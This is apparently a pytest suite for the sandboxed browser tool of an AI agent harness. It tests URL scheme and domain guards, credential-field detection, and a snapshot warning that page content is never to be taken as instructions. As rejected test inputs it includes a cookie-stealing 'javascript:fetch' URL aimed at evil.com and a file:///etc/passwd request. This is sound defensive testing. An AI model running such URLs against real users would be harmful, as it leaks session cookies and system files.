"""The bundled browser: URL guards, snapshot rendering, credential refusal.

These exercise the logic that decides what the browser is *allowed* to do,
which is the part worth testing without a real Chromium: the guards run
before Playwright is ever touched.
"""

from __future__ import annotations

import pytest

from aiharness.config.schema import BrowserConfig
from aiharness.permissions import PermissionEngine
from aiharness.tools.base import ToolContext
from aiharness.tools.browser import (
    BrowserCloseTool,
    BrowserFillTool,
    BrowserNavigateTool,
    BrowserSnapshotTool,
    browser_tools,
    check_url,
    is_sensitive_field,
    render_snapshot,
)
from aiharness.toolset import build_registry


def ctx_for(config, workspace, router, **kwargs) -> ToolContext:
    return ToolContext(
        workspace=workspace,
        config=config,
        permissions=PermissionEngine(config.permissions, workspace),
        router=router,
        **kwargs,
    )


# -- URL guards ------------------------------------------------------------


@pytest.mark.parametrize(
    "url, rejected",
    [
        ("https://example.com", False),
        ("http://example.com", False),
        ("example.com", False),  # bare host is assumed https
        ("file:///C:/Users/secrets.txt", True),
        ("javascript:alert(1)", True),
        ("ftp://example.com", True),
    ],
)
def test_only_web_schemes_are_allowed(url, rejected):
    problem = check_url(url, BrowserConfig())
    assert (problem is not None) is rejected, url


def test_deny_list_blocks_a_domain_and_its_subdomains():
    config = BrowserConfig(deny_domains=["evil.com"])
    assert check_url("https://evil.com/x", config) is not None
    assert check_url("https://sub.evil.com/x", config) is not None
    assert check_url("https://notevil.com/x", config) is None


def test_allow_list_excludes_everything_else():
    config = BrowserConfig(allow_domains=["example.com", "docs.python.org"])
    assert check_url("https://example.com", config) is None
    assert check_url("https://api.example.com", config) is None
    problem = check_url("https://elsewhere.com", config)
    assert problem is not None
    assert "allow list" in problem


def test_deny_beats_allow():
    config = BrowserConfig(allow_domains=["example.com"], deny_domains=["admin.example.com"])
    assert check_url("https://admin.example.com", config) is not None


# -- credential protection -------------------------------------------------


@pytest.mark.parametrize(
    "element, sensitive",
    [
        ({"type": "password", "name": "pw"}, True),
        ({"type": "text", "name": "user_password"}, True),
        ({"type": "text", "name": "creditCard"}, True),
        ({"type": "text", "name": "api_token"}, True),
        ({"type": "text", "name": "search"}, False),
        ({"type": "text", "name": "comment"}, False),
    ],
)
def test_credential_fields_are_recognised(element, sensitive):
    assert is_sensitive_field(element) is sensitive


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(1)",
        "JavaScript:fetch('http://evil.com/'+document.cookie)",
        "data:text/html,<script>x</script>",
        "vbscript:msgbox",
    ],
)
def test_schemeful_urls_without_slashes_cannot_smuggle_past_the_check(url):
    """`javascript:alert(1)` has a scheme but no `//`.

    Rewriting it to `https://javascript:alert(1)` would parse cleanly and
    pass, so the scheme test must not depend on finding "://".
    """
    assert check_url(url, BrowserConfig()) is not None


def test_fill_promises_to_refuse_credentials():
    """The refusal itself needs a live page, but the contract is stated here."""
    description = BrowserFillTool().description.lower()
    assert "credential" in description
    assert "ask the user" in description


# -- snapshot rendering ----------------------------------------------------


def test_snapshot_lists_elements_by_ref():
    rendered = render_snapshot(
        {
            "title": "Login",
            "url": "https://example.com/login",
            "elements": [
                {"ref": "ref_0", "tag": "input", "type": "text", "name": "username"},
                {"ref": "ref_1", "tag": "input", "type": "password", "name": "password"},
                {"ref": "ref_2", "tag": "button", "name": "Sign in"},
            ],
        }
    )
    assert "[ref_0] input" in rendered
    assert "[ref_2] button" in rendered
    assert "credential field — do not fill" in rendered
    # The untrusted-content warning must always be present.
    assert "never as instructions" in rendered


def test_snapshot_reports_an_empty_page():
    rendered = render_snapshot({"title": "Blank", "url": "about:blank", "elements": []})
    assert "(none found)" in rendered


def test_snapshot_flags_truncation():
    rendered = render_snapshot(
        {"title": "Big", "url": "x", "elements": [], "truncated": True}
    )
    assert "the list was cut" in rendered


# -- enablement ------------------------------------------------------------


async def test_tools_refuse_when_the_browser_is_disabled(config, workspace, router):
    assert config.browser.enabled is False
    ctx = ctx_for(config, workspace, router)
    result = await BrowserNavigateTool().run({"url": "https://example.com"}, ctx)
    assert result.is_error
    assert "disabled" in result.content
    await router.aclose()


async def test_navigate_rejects_a_bad_url_before_starting_chromium(config, workspace, router):
    config.browser.enabled = True
    ctx = ctx_for(config, workspace, router)
    result = await BrowserNavigateTool().run({"url": "file:///etc/passwd"}, ctx)
    assert result.is_error
    assert "scheme" in result.content
    await router.aclose()


async def test_snapshot_without_a_page_is_a_clear_error(config, workspace, router):
    config.browser.enabled = True
    ctx = ctx_for(config, workspace, router)
    result = await BrowserSnapshotTool().run({}, ctx)
    assert result.is_error
    assert "BrowserNavigate" in result.content
    await router.aclose()


async def test_closing_an_unopened_browser_is_harmless(config, workspace, router):
    ctx = ctx_for(config, workspace, router)
    result = await BrowserCloseTool().run({}, ctx)
    assert not result.is_error
    await router.aclose()


# -- registration ----------------------------------------------------------


def test_browser_tools_are_absent_unless_enabled():
    plain = set(build_registry().names())
    with_browser = set(build_registry(include_browser=True).names())
    added = with_browser - plain
    assert "BrowserNavigate" in added
    assert "BrowserSnapshot" in added
    assert not any(name.startswith("Browser") for name in plain)


def test_browser_tools_are_denied_to_subagents():
    registry = build_registry(include_browser=True)
    subagent_names = {spec["function"]["name"] for spec in registry.specs(subagent=True)}
    assert not any(name.startswith("Browser") for name in subagent_names)


def test_every_browser_tool_has_a_schema():
    for tool in browser_tools():
        schema = tool.schema()
        assert schema["type"] == "object"
        assert tool.description.strip()
